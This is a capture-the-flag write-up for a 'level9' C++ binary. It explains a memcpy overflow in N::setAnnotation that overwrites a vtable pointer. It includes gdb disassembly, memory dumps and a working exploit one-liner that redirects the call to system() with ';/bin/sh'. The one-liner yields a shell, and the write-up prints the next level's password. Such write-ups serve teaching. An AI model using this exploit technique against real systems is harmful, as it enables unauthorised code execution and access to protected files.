This binary is written in cpp. We had a lot of struggle because of the pointer to vtable, but at the end, it was easier to do it all in gdb. \
Basically, this is a buffer overflow. The method `setAnnotation` in the `N` class `memcpy` into a buffer inside the class. \
When we see what's happening when it adds 2 classes together, it basically looks for the virtual function `operator +` which is referenced through de stack. The address of the `vptr` is just after our buffer, so when we overflow the buffer, we can override the pointing address of vptr:
```
(gdb) disas main
...
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] ; -> the value of the value at esp+0x10
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx ; -> the function is called with the value at esp+0x10
...

(gdb) b *main+136
Breakpoint 4 at 0x804867c

(gdb) r $(python -c 'print "A" * 112')
Starting program: /home/user/level9/level9 $(python -c 'print "A" * 112')

(gdb) x/wx $esp+0x10
0xbffff690:	0x0804a078

(gdb) x/12wx 0x804a078-0x4
0x804a074:	0x41414141	0x41414141	0x00000000	0x00000000
		|_ just before t|he function call
				|_ the function call
0x804a084:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a094:	0x00000000	0x00000000	0x00000000	0x00000000

```
And basically, this allows us to call `system` with `/bin/sh`. We need `;` because it will just ignore the first 4 bytes which are 4 bytes from the system address:
```shell
$ ./level9 $(python -c 'print "A"*104 + "\x60\x60\xd8\xb7" + "\x74\xa0\x04\x08" + ";/bin/sh"')
					 |_ system	     |_ the address 4 bytes before
sh: 1: t: not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

```
